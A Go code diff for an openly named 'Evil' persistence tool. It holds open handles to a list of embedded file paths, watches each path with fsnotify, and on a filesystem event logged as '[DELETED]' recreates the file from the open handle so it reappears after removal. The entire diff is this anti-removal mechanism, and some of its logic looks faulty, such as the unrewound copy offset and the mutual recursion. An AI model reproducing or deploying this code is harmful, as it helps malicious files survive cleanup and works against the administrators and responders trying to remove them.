@@ -3,10 +3,13 @@ package main
 import (
 	_ "embed"
 	"fmt"
+	"io"
+	"log"
 	"os"
-	"os/signal"
+
+	// "os/signal"
 	"strings"
-	"syscall"
+	// "syscall"
 	"time"
 
 	"github.com/fsnotify/fsnotify"
@@ -20,11 +23,15 @@ var (
 var Evil = make(map[string]*os.File)
 
 func OpenFiles() {
-	lines := strings.Split(locations, "\r\n")
+	lines := strings.Split(locations, "\n")
 	i := 1
 	for _, line := range lines {
-		fmt.Println(i, line)
 		file, _ := os.Open(line)
+		if file == nil {
+			continue
+		}
+		fmt.Println(i, line)
+		// fmt.Println(err)
 		i++
 		Evil[line] = file
 
@@ -49,49 +56,61 @@ func DeletionObserver(location string) {
 	// Create a new watcher instance
 	watcher, err := fsnotify.NewWatcher()
 	if err != nil {
-		fmt.Println(err)
-		return
+		log.Fatal(err)
 	}
 	defer watcher.Close()
 
-	// Add the file to watch
+	// Start listening for events.
+	go func() {
+		for {
+			select {
+			case event, ok := <-watcher.Events:
+				if !ok {
+					return
+				}
+				// log.Println("event:", event)
+				if event.Has(fsnotify.Chmod) {
+					log.Println("[DELETED]:", event.Name)
+					log.Println("Replacing file!")
+					Replace(location, Evil[location])
+					watcher.Close()
+					Evil[location].Close()
+					return
+
+				}
+			case err, ok := <-watcher.Errors:
+				if !ok {
+					return
+				}
+				log.Println("error:", err)
+			}
+		}
+	}()
+	// Add a path.
 	err = watcher.Add(location)
 	if err != nil {
-		fmt.Println(err)
-		return
+		log.Fatal(err)
 	}
 
-	// Wait for file system events
-	for {
-		select {
-		case event, ok := <-watcher.Events:
-			if !ok {
-				return
-			}
-			if event.Op&fsnotify.Remove == fsnotify.Remove {
-				fmt.Println("File deleted:", event.Name)
-			}
-		case err, ok := <-watcher.Errors:
-			if !ok {
-				return
-			}
-			fmt.Println("Error:", err)
-		}
-	}
+	// Block main goroutine forever.
+	<-make(chan struct{})
 }
 
-func ProcessObserver(location string) {
-	// Create a channel to receive signals
-	sigCh := make(chan os.Signal, 1)
+func Replace(location string, file *os.File) {
+	// Create a new file
+	newFile, err := os.Create(location)
+	if err != nil {
+		panic(err)
+	}
+	defer newFile.Close()
 
-	// Register the channel to receive os.Interrupt signals
-	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
-
-	// Wait for a signal to be received
-	<-sigCh
-
-	// Print a message and exit
-	fmt.Println("Received interrupt signal. Exiting...")
+	// Copy the contents of the original file to the new file
+	_, err = io.Copy(newFile, file)
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println("File Replaced", location)
+	DeletionObserver(location)
 }
 
 func main() {
@@ -99,6 +118,7 @@ func main() {
 	OpenFiles()
 	fmt.Println(Evil)
 	for true {
+		fmt.Println("[HEARTBEAT]", len(Evil))
 		time.Sleep(time.Millisecond * 5000)
 	}
 }
